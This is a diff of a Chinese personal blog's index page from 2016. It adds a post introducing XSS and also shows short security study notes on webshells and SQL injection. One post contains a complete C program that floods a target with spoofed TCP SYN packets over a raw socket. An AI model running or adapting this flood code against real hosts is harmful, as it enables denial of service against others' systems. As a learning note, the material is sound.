@@ -68,6 +68,54 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-XSS攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/10/10/XSS攻击/" class="article-date">
+  <time datetime="2016-10-10T14:45:37.000Z" itemprop="datePublished">2016-10-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/10/10/XSS攻击/">XSS攻击</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>跨站脚本攻击(Cross Site Scripting): 恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p>1) 恶意用户在一些公共区域<br>( 例如建议提交表单或消息公共板的输入表单 )输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是恶意用户要输入的文本，同时还包括一些可以在客户端执行的脚本。如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">this.document = &quot;*********&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>2) 恶意提交这个表单<br>3) 其他用户看到这个包括恶意脚本的页面并执行，获取用户的cookie等敏感信息。<br><img src="img/XSSAttack.jpg" alt="XSS" title="xss"></p>
+<p>xss攻击可以分成两种类型：</p>
+<p>1.非持久型攻击</p>
+<p>2.持久型攻击</p>
+<p>上面那个属于持久型攻击。具体解释参考下面的”xss攻击入门”。</p>
+<hr>
+<p>参考网站</p>
+<p><a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html" target="_blank" rel="external">xss攻击入门</a></p>
+<p><a href="http://netsecurity.51cto.com/art/201408/448305_all.htm" target="_blank" rel="external">XSS的原理分析与解剖</a></p>
+<p><a href="http://blog.csdn.net/ghsau/article/details/17027893" target="_blank" rel="external">XSS攻击及防御</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dzyong.github.io/2016/10/10/XSS攻击/" data-id="ciue77omv0004f431tss1i2fy" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Web-Shell" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2016/10/03/Web-Shell/" class="article-date">
@@ -95,6 +143,7 @@
 <li>利用web上传业务直接上传webshell，有时也会返回上传的路径。没有返回的话也可以通过其他途径获得。</li>
 <li>利用网站代码缺陷，比如SQL注入等，植入webshell脚本。用命令来往指定的目录写入文件。</li>
 </ul>
+<hr>
 <p>参考网站</p>
 <p><a href="http://www.myhack58.com/Article/html/3/8/2016/78339.htm" target="_blank" rel="external">安全知识之Webshell攻击介绍</a></p>
 <p><a href="http://www.bitscn.com/network/hack/201003/183547.html" target="_blank" rel="external">利用上传格式限制漏洞获取Webshell</a></p>
@@ -105,7 +154,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/10/03/Web-Shell/" data-id="citzlgqoz0002qo31vuicc1mz" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/10/03/Web-Shell/" data-id="ciue77oox0008f431wax2i0rh" class="article-share-link">分享</a>
       
       
     </footer>
@@ -142,6 +191,7 @@
 <p>SQL支持 # 到该行结束、-- 到该行结束 以及 /* 行中间或多个行 */ 的注释方法。</p>
 <p>单引号 ‘ 和双引号 “ 用于表示字符串。</p>
 <p>SQL注入后即可以获取数据库信息，也可以进一步拿到web shell。</p>
+<hr>
 <p>参考网站</p>
 <p><a href="http://blog.csdn.net/stilling2006/article/details/8526458" target="_blank" rel="external">SQL注入原理讲解</a></p>
 <p><a href="http://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html" target="_blank" rel="external">SQL注入攻防入门详解</a></p>
@@ -151,7 +201,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/10/03/SQL注入/" data-id="citzlgqoz0001qo31cphmrngu" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/10/03/SQL注入/" data-id="ciue77olz0001f431hnuza9os" class="article-share-link">分享</a>
       
       
     </footer>
@@ -185,13 +235,14 @@
       
         <p>感觉这种攻击方式对小网站比较有效。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;errno.h&gt;</div><div class="line">#include &lt;netinet/tcp.h&gt;</div><div class="line">#include &lt;netinet/ip.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/socket.h&gt;</div><div class="line">#include &lt;netinet/in.h&gt;</div><div class="line">#include &lt;arpa/inet.h&gt;</div><div class="line"></div><div class="line">#pragma pack(1)</div><div class="line">struct pseudo_header    //needed for checksum calculation</div><div class="line">&#123;</div><div class="line">	unsigned int source_address;</div><div class="line">	unsigned int dest_address;</div><div class="line">	unsigned char placeholder;</div><div class="line">	unsigned char protocol;</div><div class="line">	unsigned short tcp_length;</div><div class="line"></div><div class="line">	struct tcphdr tcp;</div><div class="line">&#125;;</div><div class="line">#pragma pack()</div><div class="line"></div><div class="line">unsigned short csum(unsigned short *ptr, int nbytes) &#123;</div><div class="line"> long sum;</div><div class="line"> unsigned short oddbyte;</div><div class="line"> short answer;</div><div class="line"></div><div class="line"> sum = 0;</div><div class="line"> while (nbytes &gt; 1) &#123;</div><div class="line">   sum += *ptr++;</div><div class="line">   nbytes -= 2;</div><div class="line"> &#125;</div><div class="line"> if (nbytes == 1) &#123;</div><div class="line">   oddbyte = 0;</div><div class="line">   *((u_char*) &amp;oddbyte) = *(u_char*) ptr;</div><div class="line">   sum += oddbyte;</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);</div><div class="line"> sum = sum + (sum &gt;&gt; 16);</div><div class="line"> answer = (short) ~sum;</div><div class="line"></div><div class="line"> return (answer);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void oneSyn(int socketfd, in_addr_t source, u_int16_t sourcePort,</div><div class="line">		in_addr_t destination, u_int16_t destinationPort) &#123;</div><div class="line">	static char sendBuf[sizeof(iphdr) + sizeof(tcphdr)] = &#123; 0 &#125;;</div><div class="line">	bzero(sendBuf, sizeof(sendBuf));</div><div class="line"></div><div class="line">	struct iphdr* ipHeader = (iphdr*) sendBuf;</div><div class="line">	struct tcphdr *tcph = (tcphdr*) (sendBuf + sizeof(iphdr));</div><div class="line"></div><div class="line">	ipHeader-&gt;version = 4;</div><div class="line">	ipHeader-&gt;ihl = 5;</div><div class="line"></div><div class="line">	ipHeader-&gt;tos = 0;</div><div class="line">	ipHeader-&gt;tot_len = htons(sizeof(sendBuf));</div><div class="line"></div><div class="line">	ipHeader-&gt;id = htons(1);</div><div class="line">	ipHeader-&gt;frag_off = 0;</div><div class="line">	ipHeader-&gt;ttl = 254;</div><div class="line">	ipHeader-&gt;protocol = IPPROTO_TCP;</div><div class="line">	ipHeader-&gt;check = 0;</div><div class="line">	ipHeader-&gt;saddr = source;</div><div class="line">	ipHeader-&gt;daddr = destination;</div><div class="line"></div><div class="line">	ipHeader-&gt;check = csum((unsigned short*) ipHeader, ipHeader-&gt;ihl * 2);</div><div class="line"></div><div class="line">	//TCP Header</div><div class="line">	tcph-&gt;source = htons(sourcePort);</div><div class="line">	tcph-&gt;dest = htons(destinationPort);</div><div class="line">	tcph-&gt;seq = 0;</div><div class="line">	tcph-&gt;ack_seq = 0;</div><div class="line">	tcph-&gt;doff = 5; //sizeof(tcphdr)/4</div><div class="line">	tcph-&gt;fin = 0;</div><div class="line">	tcph-&gt;syn = 1;</div><div class="line">	tcph-&gt;rst = 0;</div><div class="line">	tcph-&gt;psh = 0;</div><div class="line">	tcph-&gt;ack = 0;</div><div class="line">	tcph-&gt;urg = 0;</div><div class="line">	tcph-&gt;window = htons(512);</div><div class="line">	tcph-&gt;check = 0;</div><div class="line">	tcph-&gt;urg_ptr = 0;</div><div class="line"></div><div class="line">	//tcp header checksum</div><div class="line">	struct pseudo_header pseudoHeader;</div><div class="line">	pseudoHeader.source_address = source;</div><div class="line">	pseudoHeader.dest_address = destination;</div><div class="line">	pseudoHeader.placeholder = 0;</div><div class="line">	pseudoHeader.protocol = IPPROTO_TCP;</div><div class="line">	pseudoHeader.tcp_length = htons(sizeof(tcphdr));</div><div class="line">	memcpy(&amp;pseudoHeader.tcp, tcph, sizeof(struct tcphdr));</div><div class="line"></div><div class="line">	tcph-&gt;check = csum((unsigned short*) &amp;pseudoHeader, sizeof(pseudo_header));</div><div class="line"></div><div class="line">	struct sockaddr_in sin;</div><div class="line">	sin.sin_family = AF_INET;</div><div class="line">	sin.sin_port = htons(sourcePort);</div><div class="line">	sin.sin_addr.s_addr = destination;</div><div class="line"></div><div class="line">	ssize_t sentLen = sendto(socketfd, sendBuf, sizeof(sendBuf), 0,</div><div class="line">			(struct sockaddr *) &amp;sin, sizeof(sin));</div><div class="line">	if (sentLen == -1) &#123;</div><div class="line">		perror(&quot;sent error&quot;);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(void) &#123;</div><div class="line">	//for setsockopt</div><div class="line">	int optval = 1;</div><div class="line"></div><div class="line">	//create a raw socket</div><div class="line">	int socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);</div><div class="line">	if (socketfd == -1) &#123;</div><div class="line">		perror(&quot;create socket:&quot;);</div><div class="line">		exit(0);</div><div class="line">	&#125;</div><div class="line">	if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &amp;optval, sizeof(optval))</div><div class="line">			&lt; 0) &#123;</div><div class="line">		perror(&quot;create socket:&quot;);</div><div class="line">		exit(0);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	in_addr_t source = inet_addr(&quot;192.168.1.100&quot;);</div><div class="line">	in_addr_t destination = inet_addr(&quot;192.168.1.101&quot;);</div><div class="line">	u_int16_t sourcePort = 1;</div><div class="line">	u_int16_t destinationPort = 9999;</div><div class="line">	while (1) &#123;</div><div class="line">		oneSyn(socketfd, source, sourcePort++, destination,</div><div class="line">				destinationPort);</div><div class="line">		sourcePort %= 65535;</div><div class="line">		sleep(1);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<hr>
 <p>参考资料：</p>
 <p><a href="http://blog.csdn.net/hengyunabc/article/details/24934529" target="_blank" rel="external">网络编程之Tcp SYN flood洪水攻击 </a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/10/02/TCP-sync-flood/" data-id="citzlgqoj0000qo31n70quskc" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/10/02/TCP-sync-flood/" data-id="ciue77olz0000f4311lupr0l9" class="article-share-link">分享</a>
       
       
     </footer>
@@ -236,7 +287,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/10/02/程序加壳加花/" data-id="citzlgqpe0006qo31xg1ki2dg" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/10/02/程序加壳加花/" data-id="ciue77omv0005f4312etpwaqq" class="article-share-link">分享</a>
       
       
     </footer>
@@ -275,7 +326,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/09/11/有道云笔记/" data-id="citzlgqpe0005qo319tw88nvq" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/09/11/有道云笔记/" data-id="ciue77oo50007f431i9q1429e" class="article-share-link">分享</a>
       
       
     </footer>
@@ -313,7 +364,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/09/10/葡萄/" data-id="citzlgqpe0007qo319pad8i7o" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/09/10/葡萄/" data-id="ciue77onw0006f4310fgl41o6" class="article-share-link">分享</a>
       
       
     </footer>
@@ -358,7 +409,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/09/10/hello-world/" data-id="citzlgqoz0003qo31zi901d4w" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/09/10/hello-world/" data-id="ciue77omf0002f4315i4l6ujm" class="article-share-link">分享</a>
       
       
     </footer>
@@ -449,7 +500,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dzyong.github.io/2016/09/05/hexo-搭建/" data-id="citzlgqoz0004qo31nqls5afa" class="article-share-link">分享</a>
+      <a data-url="https://dzyong.github.io/2016/09/05/hexo-搭建/" data-id="ciue77omf0003f431wv0d1ffx" class="article-share-link">分享</a>
       
       
     </footer>
@@ -489,6 +540,10 @@
       <ul>
         
           <li>
+            <a href="/2016/10/10/XSS攻击/">XSS攻击</a>
+          </li>
+        
+          <li>
             <a href="/2016/10/03/Web-Shell/">Web Shell</a>
           </li>
         
@@ -502,10 +557,6 @@
         
           <li>
             <a href="/2016/10/02/程序加壳加花/">程序加壳加花</a>
-          </li>
-        
-          <li>
-            <a href="/2016/09/11/有道云笔记/">有道云笔记</a>
           </li>
         
       </ul>
